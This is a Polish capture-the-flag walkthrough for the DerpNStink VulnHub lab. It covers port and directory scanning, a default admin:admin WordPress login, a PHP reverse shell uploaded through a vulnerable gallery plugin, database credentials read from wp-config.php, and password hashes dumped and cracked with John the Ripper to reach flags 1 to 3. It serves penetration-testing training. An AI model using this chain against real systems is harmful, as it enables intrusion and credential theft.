# DerpNStink: 1 VulnHub Machine Walkthrough (PL)
## Wstęp
W poniższym walkthrough zajmiemy się podatną VM dostępną na https://www.vulnhub.com. To ciekawe wyzwanie boot2root, będzie wymagało od początkujących podejścia i działania "out-of-the-box", ponieważ zahacza o wiele różnych obszarów i tooli dla pentesterów. Uprzedzam, że zadanie zawiera kilka zagwozdek, jednak wspólnie stawimy im dzisiaj czoła i mam nadzieję będzie to dla nas wszystkich równie satysfakcjonujące! Zachęcam również do samodzielnego, dalszego eksplorowania
wszystkich omawianych zagadnień. **Prezentowany sposób nie jest wyłącznym możliwym, a jedynie jednym z wielu.** Eksperymentowanie i wypracowanie sobie własnego sposobu hackowania jest tutaj mile widziane.
Autor zostawił dla nas następującą wiadomość:


>_Your goal is to remotely attack the VM and find all 4 flags eventually leading you to full root access. Don't forget to #tryharder_

>_Example: flag1(AB0BFD73DAAEC7912DCDCA1BA0BA3D05). Do not waste time decrypting the hash in the flag as it has no value in the challenge other than an identifier_.

Zamiast marnować czas, **let's cut straight to the chase**! :-)

## 1. Inicjalny skan & zbieranie informacji

Domyślnie serwer DHCP VirtualBox przydziela naszemu klientowi (gościowi) adres IP według wzoru: 192.168.56.x \
W tym kroku odpalamy narzędzie **nmap** i przystępujemy do poszukania dostępnych portów i usług

`nmap -sT -sV -A 192.168.56.0/24`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-25 10:27 CET
Nmap scan report for 192.168.56.100
Host is up (0.00018s latency).
All 65535 scanned ports on 192.168.56.100 are filtered
MAC Address: 08:00:27:9F:B5:DD (Oracle VirtualBox virtual NIC)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.18 ms 192.168.56.100

Nmap scan report for 192.168.56.101
Host is up (0.00074s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
MAC Address: 08:00:27:15:6A:1A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.74 ms 192.168.56.101

Nmap scan report for 192.168.56.1
Host is up (0.000079s latency).
All 65535 scanned ports on 192.168.56.1 are closed
Too many fingerprints match this host to give specific OS details
Network Distance: 0 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (3 hosts up) scanned in 27.38 seconds

```
---
### Kod HTML
Nmap odkrył przed nami dostępne i działające usługi **FTP, SSH i HTTP.** \
Zacznijmy od ostatniej z nich. Wydaje się być dobra na początek. Odpalmy przeglądarke i zobaczmy czy czeka tam na nas jakaś  niespodzianka.

![derpnstink.png](https://raw.githubusercontent.com/d15rup7or/Labs/master/DerpNStink/img/derpnstink.png)

Jak widać to zwykły landing page, czyli nic szczególnego. A co jeśli zajrzymy do kodu źródłowego strony **(Ctrl+U)**?

![viewsource](https://raw.githubusercontent.com/d15rup7or/Labs/master/DerpNStink/img/viewsource.png)

Brawo! Mamy naszą pierwszą flagę :)
`<--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->`

> Alternatywnym sposobem na zdobycie pierwszej flagi jest skorzystanie z biblioteki cURL \
`curl http://192.168.56.101/`

---

### Web Notes 
Rzucając okiem na kod źródłowy zauważam jeszcze jedną rzecz. To katalog ***/webnotes***

`# curl http://192.168.56.101/webnotes/`

```
[stinky@DeRPnStiNK /var/www/html ]$ whois derpnstink.local
   Domain Name: derpnstink.local
   Registry Domain ID: 2125161577_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.fakehosting.com
   Registrar URL: http://www.fakehosting.com
   Updated Date: 2017-11-12T16:13:16Z
   Creation Date: 2017-11-12T16:13:16Z
   Registry Expiry Date: 2017-11-12T16:13:16Z
   Registrar: fakehosting, LLC
   Registrar IANA ID: 1337
   Registrar Abuse Contact Email: stinky@derpnstink.local
   Registrar Abuse Contact Phone:
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited

   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of whois database: 2017-11-12T16:13:16Z <<<

For more information on Whois status codes, please visit https://icann.org/epp

NOTICE: The expiration date displayed in this record is the date the
registrar's sponsorship of the domain name registration in the registry is
currently set to expire. This date does not necessarily reflect the expiration
date of the domain name registrant's agreement with the sponsoring
registrar.  Users may consult the sponsoring registrar's Whois database to
view the registrar's reported date of expiration for this registration.

TERMS OF USE: You are not authorized to access or query our Whois                                
database through the use of electronic processes that are high-volume and                        
automated except as reasonably necessary to register domain names or                             
modify existing registrations; the Data in VeriSign Global Registry                              
Services' ("VeriSign") Whois database is provided by VeriSign for                                
information purposes only, and to assist persons in obtaining information                        
about or related to a domain name registration record. VeriSign does not                         
guarantee its accuracy. By submitting a Whois query, you agree to abide                          
by the following terms of use: You agree that you may use this Data only                         
for lawful purposes and that under no circumstances will you use this Data                       
to: (1) allow, enable, or otherwise support the transmission of mass
unsolicited, commercial advertising or solicitations via e-mail, telephone,
or facsimile; or (2) enable high volume, automated, electronic processes
that apply to VeriSign (or its computer systems). The compilation,
repackaging, dissemination or other use of this Data is expressly
prohibited without the prior written consent of VeriSign. You agree not to
use electronic processes that are automated and high-volume to access or
query the Whois database except as reasonably necessary to register
domain names or modify existing registrations. VeriSign reserves the right
to restrict your access to the Whois database in its sole discretion to ensure
operational stability.  VeriSign may restrict or terminate your access to the
Whois database for failure to abide by these terms of use. VeriSign
reserves the right to modify these terms at any time.

The Registry database contains ONLY .COM, .NET, .EDU domains and
Registrars.

[stinky@DeRPnStiNK: /var/www/html/php]~$ ping derpnstink.local
PING derpnstink.local (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.015 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.018 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.025 ms
64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.023 ms
64 bytes from localhost (127.0.0.1): icmp_seq=5 ttl=64 time=0.022 ms
64 bytes from localhost (127.0.0.1): icmp_seq=6 ttl=64 time=0.025 ms
64 bytes from localhost (127.0.0.1): icmp_seq=7 ttl=64 time=0.026 ms
^C
--- derpnstink.local ping statistics ---
7 packets transmitted, 7 received, 0% packet loss, time 5998ms
rtt min/avg/max/mdev = 0.015/0.022/0.026/0.003 ms
stinky@DeRPnStiNK:~$ 
```
Kilka rzeczy, które odkryliśmy po drodze:
* Mamy do czynienia z **bazą danych** (jest tutaj jakiś CMS?)
* Istnieje użytkownik **stinky**
* Pełna nazwa domenowa (FQDS) to **derpnstink.local**
* Ścieżka do katalogu, z którego serwer pobiera pliki (DocumentRoot) to **/var/www/html**

Zobaczmy co da nam zmapowanie adresu ip na adres domenowy w /etc/hosts 

### Enumeracja katalogów i plików



Spróbujmy zajrzeć do pliku robots.txt

Wykorzystamy `gobuster` i listę `directory-list-2.3-medium.txt`

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.101
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/02/25 17:20:09 Starting gobuster
===============================================================
/weblog (Status: 301)
/php (Status: 301)
/css (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/temporary (Status: 301)
/server-status (Status: 403)
===============================================================
2020/02/25 17:21:05 Finished                                                                                                                              
=============================================================== 
```

Wygląda na to, że katalog ***/weblog*** to główny katalog Wordpressa

WPScan pozwoli nam sprawdzić czy na stronie są wykorzystywane jakieś podatne pluginy <br>
`wpscan --url http://derpnstink.local/weblog/ -e u ap`

```
[+] slideshow-gallery
 | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/
 | Last Updated: 2019-07-12T13:09:00.000Z
 | [!] The version is out of date, the latest version is 1.6.12
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.4.6 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt
```
Tym razem wtyczka *Slideshow Gallery* nie została zaktualizowana (1.4.6). Ta wersja okazuje się być podatna na **Arbitrary File Upload**

Dodatkowo wpscan odsłonił przed nami dwóch użytkowników
```
[i] User(s) Identified:

[+] unclestinky
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

Pozostaje nam wykorzystać tę informację i spróbować się zalogować
![](https://github.com/d15rup7or/Labs/blob/master/DerpNStink/img/wp-login-page.png)

Zobaczmy czy zadziała z tym hasłem
`login:admin password:admin`

Tym razem się udało. W rezultacie trafiamy do panelu wordpressa jako użytkownik z ograniczonymi uprawnieniami. 
![](https://github.com/d15rup7or/Labs/blob/master/DerpNStink/img/slideshow.png)

## 2. Reverse shell

Kolejnym krokiem będzie uploadowanie [PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) (Kali Linux ma go w katalogu `usr/share/webshells/php`) (wcześniej zmieniamy w nim parametry $ip na adres maszyny wirtualnej oraz $port) 
![](https://github.com/d15rup7or/Labs/blob/master/DerpNStink/img/shell-upload.png)

Odpalamy netcat i ustawiamy go tak żeby nasłuchiwał na uprzednio wybranym porcie. Dla nas będzie to port **4443**: <br>
`nc -nlvp 4443`

```
listening on [any] 4443 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 35050
Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
 08:07:59 up  1:15,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
Sprawdźmy czy możemy użyć Pythona dla upgradu shella
```
$ which python
/usr/bin/python
```
Upgradujmy shella do interaktywnego TTY <br>

`python -c 'import pty;pty.spawn("/bin/bash")'`

I voilà! Mamy pełnowymiarową powłokę"

```
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@DeRPnStiNK:/$   
```
Wejdźmy do katalogu `/var/www/html` i zobaczmy co na nas czeka
```
www-data@DeRPnStiNK:/$ cd /var/www/html
cd /var/www/html
www-data@DeRPnStiNK:/var/www/html$ 
```

Wylistujmy zawartość
`ls -l`
```
drwxr-xr-x 2 root     root   4096 Nov 11  2017 css
-rw-r--r-- 1 root     root 108987 Nov 11  2017 derp.png
-rw-r--r-- 1 root     root   1298 Nov 12  2017 index.html
drwxr-xr-x 2 root     root   4096 Nov 11  2017 js
drwxr-xr-x 2 root     root   4096 Nov 11  2017 php
-rw-r--r-- 1 root     root     53 Nov 11  2017 robots.txt
-rw-r--r-- 1 root     root 222045 Nov 11  2017 stinky.png
drwxrwxrwx 2 root     root   4096 Nov 12  2017 temporary
drwxr-xr-x 5 www-data root   4096 Dec 12  2017 weblog
drwxr-xr-x 2 root     root   4096 Jan  9  2018 webnotes
```

Zobaczmy co dalej `cd weblog` -> `ls`
```
www-data@DeRPnStiNK:/var/www/html$ cd weblog
cd weblog
www-data@DeRPnStiNK:/var/www/html/weblog$ ls
ls
index.php        wp-blog-header.php    wp-cron.php        wp-mail.php
license.txt      wp-comments-post.php  wp-includes        wp-settings.php
readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php
wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php
wp-admin         wp-content            wp-login.php       xmlrpc.php
www-data@DeRPnStiNK:/var/www/html/weblog$ 
```
Ciekawość nakazuje zajrzeć do pliku _wp-config.php_ (zazwyczaj zawiera dane dot. konfiguracji MySQL takie jak prefixy, klucze i dane dostępowe)
`less wp-config.php`

```
:
/** MySQL database username */
:
define('DB_USER', 'root');
:

:
/** MySQL database password */
:
define('DB_PASSWORD', 'mysql');
:

:
/** MySQL hostname */
:
define('DB_HOST', 'localhost');
:
```

Jak widzimy możemy zalogować się do MySQL za pomocą danych `root:mysql`

## 3. Enumeracja bazy danych MySQL

`mysql -u root -pmysql`

```
www-data@DeRPnStiNK:/var/www/html/weblog$ mysql -u root -pmysql
mysql -u root -pmysql
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 148
Server version: 5.5.58-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```
Zobaczmy jak duży mamy wybór i ustalmy co może nam się przydać. Rozejrzyjmy się od razu za danymi dostępowymi.

`show databases;`

```
mysql> show databases
show databases
    -> ;
;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| phpmyadmin         |
| wordpress          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use wordpress;
use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+----------------------------+
| Tables_in_wordpress        |
+----------------------------+
| wp_commentmeta             |
| wp_comments                |
| wp_gallery_galleries       |
| wp_gallery_galleriesslides |
| wp_gallery_slides          |
| wp_links                   |
| wp_options                 |
| wp_postmeta                |
| wp_posts                   |
| wp_term_relationships      |
| wp_term_taxonomy           |
| wp_termmeta                |
| wp_terms                   |
| wp_usermeta                |
| wp_users                   |
+----------------------------+
15 rows in set (0.01 sec)
```
Wyświetlamy informacje o kolumnach w tabeli `wp_users`:<br>
`show columns from wp_users;`

```
mysql> show columns from wp_users;
show columns from wp_users;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(255)        | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   | MUL |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(255)        | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
| flag2               | text                | NO   |     | NULL                |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
11 rows in set (0.01 sec)
```

Wygląda na to, że mamy kolejną flagę.
```
mysql> select flag2 from wp_users;
select flag2 from wp_users;
+-------+
| flag2 |
+-------+
|       |
|       |
+-------+
2 rows in set (0.00 sec)
```

Niestety nie tym razem. W zamian poszukajmy loginów i haseł istniejących użytkowników:
`select user_login, user_pass from wp_users;`

W efekcie dostajemy:

```
mysql> select user_login, user_pass from wp_users;
select user_login, user_pass from wp_users;
+-------------+------------------------------------+
| user_login  | user_pass                          |
+-------------+------------------------------------+
| unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 |
| admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ |
+-------------+------------------------------------+
2 rows in set (0.01 sec)
```
Warto przypomnieć, że znamy już hasło użytkownika _admin_, teraz przyda nam się komplet danych dla _unclestinky_

Przyjrzyjmy się jeszcze bazie mysql
```
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| phpmyadmin         |
| wordpress          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use mysql
use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| ndb_binlog_index          |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| servers                   |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
24 rows in set (0.00 sec)
```
Wyświetlmy listę kolumn i zobaczmy dostępnych Użytkowników i Hasła:
`show columns from user;` -> `select User,Password from user;`

```
mysql> select User,Password from user;
select User,Password from user;
+------------------+-------------------------------------------+
| User             | Password                                  |
+------------------+-------------------------------------------+
| root             | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
| root             | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
| root             | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
| root             | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
| debian-sys-maint | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
| unclestinky      | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
| phpmyadmin       | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
+------------------+-------------------------------------------+
7 rows in set (0.01 sec)
```
Naszym targetem będzie użytkownik _unclestinky_. Zanim przystąpimy do dalszych działań, użyjemy narzędzia o nazwie **hash-identifier**. W wyniku dostajemy:

```
Possible Hashs:
[+] MySQL 160bit - SHA-1(SHA-1($pass))
```
Kolej na password cracking przy wykorzystaniu toola **John The Ripper**

Zapisujemy dane do pliku _mysql_hashes.txt_ i formatujemy tekst do postaci `user:hash` (możemy zrobić to manualnie lub za pomocą kombinacji komend)


Wywołujemy **Johna** i korzystamy z gotowej listy słownikowej:<br>
`john mysql_hash.txt --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt` <br>

Wreszcie możemy zobaczyć efekty:<br>
`john --show mysql_hash.txt`

```
root@kali:~/Pulpit# john --show mysql_hashes.txt
unclestinky:wedgie57

1 password hash cracked, 0 left
```

Wykorzystajmy te dane aby zalogować się do wordpressa. Tam w zakładce **Posts** czeka na nas druga flaga:
`flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)`

Trzecią flagę znajdziemy w katalogu Desktop użytkownika unclestinky
`flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)`

